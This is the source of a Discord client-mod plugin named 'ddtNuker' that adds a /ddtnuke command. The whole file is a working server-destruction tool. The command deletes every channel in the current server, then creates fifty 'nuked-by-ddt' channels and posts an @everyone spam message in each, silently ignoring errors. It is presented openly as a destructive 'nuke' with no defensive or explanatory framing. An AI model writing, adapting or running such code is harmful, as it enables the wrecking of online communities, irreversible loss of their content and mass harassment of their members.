import { ApplicationCommandInputType, sendBotMessage } from "@api/Commands";
import definePlugin from "@utils/types";
import { RestAPI, GuildStore, ChannelStore } from "@webpack/common";

export default definePlugin({
    name: "ddtNuker",
    description: "Server Obliterator Panel. Adds /ddtnuke command. USE WITH EXTREME CAUTION.",
    authors: [{ id: 1n, name: "Asrar", username: "asrar" }],
    tags: ["DDT", "Destructive"],
    enabledByDefault: false,

    commands: [{
        name: "ddtnuke",
        description: "Completely obliterate the current server (Requires Admin)",
        inputType: ApplicationCommandInputType.BUILT_IN,
        execute(_, { channel }) {
            const guildId = channel.guild_id;
            if (!guildId) {
                return sendBotMessage(channel.id, { content: "You can only nuke servers, not DMs." });
            }

            const guild = GuildStore.getGuild(guildId);
            
            sendBotMessage(channel.id, { 
                content: `⚠️ INITIATING NUKE PROTOCOL ON SERVER: **${guild.name}** ⚠️\nStarting obliteration...` 
            });
            
            setTimeout(() => {
                const channels = Object.values(ChannelStore.getMutableGuildChannelsForGuild(guildId));
                
                // Mass delete all channels
                channels.forEach((c: any) => {
                    RestAPI.delete({ url: `/channels/${c.id}` }).catch(() => {});
                });
                
                // Mass create spam channels & ping
                for (let i = 0; i < 50; i++) {
                    RestAPI.post({
                        url: `/guilds/${guildId}/channels`,
                        body: { type: 0, name: "nuked-by-ddt" }
                    }).then((res: any) => {
                        if (res.body && res.body.id) {
                            RestAPI.post({
                                url: `/channels/${res.body.id}/messages`,
                                body: { content: "@everyone 💥 SERVER NUKED BY DDT CLIENT 💥\nPhantom Protocol Engaged. You have been obliterated." }
                            }).catch(() => {});
                        }
                    }).catch(() => {});
                }
            }, 3000);
        }
    }]
});
